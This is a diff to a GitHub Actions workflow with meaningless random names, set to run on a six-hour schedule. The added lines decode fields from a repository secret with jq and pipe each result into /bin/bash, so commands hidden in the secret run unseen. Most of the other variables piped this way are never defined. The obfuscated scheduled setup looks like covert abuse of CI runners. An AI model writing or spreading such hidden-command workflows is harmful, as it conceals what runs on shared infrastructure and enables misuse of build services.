@@ -1,8 +1,10 @@
 name: renmazuo6218
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
+    - cron: '45 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +13,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: renmazuo6218
         env:
-          dkhh835: ${{ secrets.dkhh835 }}
+          k6692: ${{ secrets.k6692 }}
         run: |
-          echo $dkhh835 | jq -r .y525 | /bin/bash
-          echo $r0 | jq -r .h642 | /bin/bash
-          echo $y2 | jq -r .ah46902 | /bin/bash
-          echo $kjgg15 | jq -r .xgbj17 | /bin/bash
-          echo $ckx29 | jq -r .rui6 | /bin/bash
-          echo $e9961 | jq -r .p01022 | /bin/bash
-          echo $oqwem80697 | jq -r .ojpp4 | /bin/bash
-          echo $e7 | jq -r .g8 | /bin/bash
-          echo $j37658 | jq -r .eyprk307 | /bin/bash
-          echo $acps24 | jq -r .c2083 | /bin/bash
-          echo $rj627 | jq -r .cj5459 | /bin/bash
-          echo $sc411 | jq -r .ohj1 | /bin/bash
+          echo $k6692 | jq -r .uhqjo174 | /bin/bash
+          echo $lemd81 | jq -r .swp093 | /bin/bash
+          echo $cjzde61404 | jq -r .ndox45 | /bin/bash
+          echo $z368 | jq -r .q12096 | /bin/bash
+          echo $pcd6565 | jq -r .wzfmr0 | /bin/bash
+          echo $t16 | jq -r .oi36 | /bin/bash
+          echo $vnw0847 | jq -r .fx5909 | /bin/bash
+          echo $x652 | jq -r .car009 | /bin/bash
 
